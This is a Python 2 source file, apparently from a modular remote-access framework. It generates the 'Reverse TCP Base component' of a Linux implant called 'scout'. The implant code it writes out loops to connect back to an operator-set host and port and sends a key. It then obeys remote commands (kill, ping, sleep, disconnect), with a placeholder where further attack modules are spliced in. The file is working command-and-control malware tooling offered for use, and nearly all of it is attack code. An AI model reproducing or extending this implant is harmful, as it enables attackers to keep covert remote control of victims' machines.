
import library.modules.config as config
import library.modules.safe_open as safe_open

config.main()


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        with safe_open.main(filepath, 'w') as f:
            if ',' in host:
                host = str(host.replace(' ','').split(','))
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                s = socket.socket()
                s.settimeout(variable_timeout)
                s.connect((i,variable_port))
                s.sendall('variable_key')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                s.sendall(help_menu)
            elif command == 'ping':
                s.sendall('[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            s.sendall('[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
            'variable_key', key))
            else:
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999)
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999)
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data

while True:
    while True:
        try:
            s = socket.socket()
            s.settimeout(variable_timeout)
            s.connect(('variable_host',variable_port))
            s.sendall('variable_key')
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                s.sendall(help_menu)
            elif command == 'ping':
                s.sendall('[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout):
            s.close()
            break
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            s.sendall('[!]Error in scout : ' + str(e))
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
            'variable_key', key))
    elif option == 'info':
        print '\nName             : Reverse TCP Base component' \
              '\nOS               : Linux' \
              '\nRequired Modules : socket, time' \
              '\nCommands         : kill, ping, sleep <time>, disconnect' \
              '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands' \
              '\nConnection type  : Reverse\n'
